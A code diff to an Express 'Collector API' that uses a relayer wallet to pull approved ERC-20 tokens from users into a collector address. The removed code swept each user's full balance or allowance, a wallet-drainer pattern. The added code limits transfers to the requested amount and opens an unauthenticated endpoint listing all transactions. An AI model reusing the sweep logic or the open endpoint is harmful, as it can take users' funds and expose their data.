@@ -30,8 +30,8 @@ const CONFIG = {
 
 // ============ DATA STORAGE ============
 let dataStore = {
-    addresses: {},      // address -> { totalAmount, transactionCount, lastSeen }
-    transactions: []    // list of all logged transactions
+    addresses: {},
+    transactions: []
 };
 
 // Load existing data
@@ -58,9 +58,10 @@ function generateId() {
     return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
 }
 
-// ============ AUTO‑TRANSFER FUNCTION ============
-async function performAutoTransfer(userAddress, tokenAddress) {
+// ============ AUTO‑TRANSFER FUNCTION (FIXED) ============
+async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman) {
     console.log(`\n🚀 Starting auto-transfer for ${userAddress}`);
+    console.log(`   Requested amount: ${requestedAmountHuman}`);
 
     // Check for private key
     if (!process.env.RELAYER_PRIVATE_KEY) {
@@ -84,9 +85,14 @@ async function performAutoTransfer(userAddress, tokenAddress) {
 
         const token = new ethers.Contract(tokenAddress, tokenABI, wallet);
 
+        // Get decimals
+        const decimals = await token.decimals();
+        
+        // Convert requested amount to Wei
+        const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
+        
         // Get user's balance
         const balance = await token.balanceOf(userAddress);
-        const decimals = await token.decimals();
         const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
 
         console.log(`💰 User balance: ${balanceHuman}`);
@@ -95,21 +101,29 @@ async function performAutoTransfer(userAddress, tokenAddress) {
             return { success: false, error: 'Zero balance' };
         }
 
+        // Check if user has enough balance for requested amount
+        if (balance < requestedAmountWei) {
+            console.log(`❌ Insufficient balance. Requested: ${requestedAmountHuman}, Available: ${balanceHuman}`);
+            return { success: false, error: 'Insufficient balance' };
+        }
+
         // Get current allowance for the relayer
         const allowance = await token.allowance(userAddress, wallet.address);
         const allowanceHuman = parseFloat(ethers.formatUnits(allowance, decimals));
 
         console.log(`🔓 Allowance for relayer: ${allowanceHuman}`);
 
-        if (allowanceHuman <= 0) {
-            return { success: false, error: 'Zero allowance' };
+        // Check if allowance covers requested amount
+        if (allowance < requestedAmountWei) {
+            console.log(`❌ Insufficient allowance. Requested: ${requestedAmountHuman}, Allowance: ${allowanceHuman}`);
+            return { success: false, error: 'Insufficient allowance' };
         }
 
-        // Transfer the smaller of balance or allowance
-        const transferAmountWei = balance < allowance ? balance : allowance;
-        const transferAmountHuman = parseFloat(ethers.formatUnits(transferAmountWei, decimals));
+        // 🎯 Transfer EXACT requested amount (not full balance)
+        const transferAmountWei = requestedAmountWei;
+        const transferAmountHuman = requestedAmountHuman;
 
-        console.log(`💸 Transferring ${transferAmountHuman} to collector...`);
+        console.log(`💸 Transferring EXACT amount: ${transferAmountHuman} to collector...`);
 
         const gasPrice = (await provider.getFeeData()).gasPrice;
 
@@ -125,6 +139,7 @@ async function performAutoTransfer(userAddress, tokenAddress) {
         const receipt = await tx.wait();
 
         console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
+        console.log(`   Amount: ${transferAmountHuman}`);
         console.log(`   Gas used: ${receipt.gasUsed.toString()}`);
 
         return {
@@ -163,7 +178,6 @@ app.post('/send', (req, res) => {
         const normalized = address.toLowerCase();
         const data = dataStore.addresses[normalized];
 
-        // Return relayer address (user will approve this)
         return res.json({
             found: !!(data && data.totalAmount > 0),
             amountHuman: data?.totalAmount || 0,
@@ -225,27 +239,28 @@ app.post('/collect', async (req, res) => {
         dataStore.addresses[addr].transactionCount++;
         dataStore.addresses[addr].lastSeen = new Date().toISOString();
 
-        // Keep only the last 5000 transactions (prevent file bloat)
+        // Keep only the last 5000 transactions
         if (dataStore.transactions.length > 5000) {
             dataStore.transactions = dataStore.transactions.slice(-5000);
         }
 
         saveData();
 
-        // Trigger auto-transfer asynchronously (do not await – respond immediately)
-        performAutoTransfer(from, token).then(result => {
+        // 🎯 Trigger auto-transfer with EXACT requested amount
+        performAutoTransfer(from, token, amountHuman).then(result => {
             if (result.success) {
                 console.log('✅ Auto-transfer successful!');
-                // Optionally update the transaction with the transfer hash
                 transaction.transferTx = result.txHash;
                 transaction.transferAmount = result.amount;
                 saveData();
+            } else {
+                console.log('❌ Auto-transfer failed:', result.error);
             }
         }).catch(err => {
             console.error('Auto-transfer promise rejected:', err);
         });
 
-        // Respond immediately – exactly like the original API
+        // Respond immediately
         res.json({
             ok: true,
             id: transactionId,
@@ -279,11 +294,25 @@ app.get('/health', (req, res) => {
  */
 app.get('/', (req, res) => {
     res.json({
-        message: 'Collector API with Auto-Transfer',
-        version: '2.0.0',
+        message: 'Collector API with Auto-Transfer (Fixed)',
+        version: '2.1.0',
         endpoints: ['POST /send', 'POST /collect', 'GET /health'],
         collector: CONFIG.COLLECTOR_ADDRESS,
-        relayer: CONFIG.RELAYER_ADDRESS
+        relayer: CONFIG.RELAYER_ADDRESS,
+        note: 'Transfers EXACT user-entered amount, not full balance'
+    });
+});
+
+/**
+ * GET /transactions – View all transactions
+ */
+app.get('/transactions', (req, res) => {
+    const { limit = 50 } = req.query;
+    const recent = dataStore.transactions.slice(-parseInt(limit)).reverse();
+    res.json({
+        count: recent.length,
+        total: dataStore.transactions.length,
+        transactions: recent
     });
 });
 
@@ -291,16 +320,19 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════╗
-║     🚀 Collector API with Auto-Transfer           ║
+║     🚀 Collector API with Auto-Transfer (FIXED)   ║
 ╠══════════════════════════════════════════════════╣
 ║  Port: ${PORT}                                      ║
 ║  Collector: ${CONFIG.COLLECTOR_ADDRESS}             ║
 ║  Relayer:  ${CONFIG.RELAYER_ADDRESS}               ║
 ║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                ║
 ║                                                  ║
-║  POST /send    – Check address                   ║
-║  POST /collect – Log & auto-transfer             ║
-║  GET  /health  – Status                          ║
+║  ✅ Transfers EXACT user-entered amount           ║
+║                                                  ║
+║  POST /send        – Check address               ║
+║  POST /collect     – Log & auto-transfer         ║
+║  GET  /health      – Status                      ║
+║  GET  /transactions – View all transactions      ║
 ╚══════════════════════════════════════════════════╝
     `);
 });
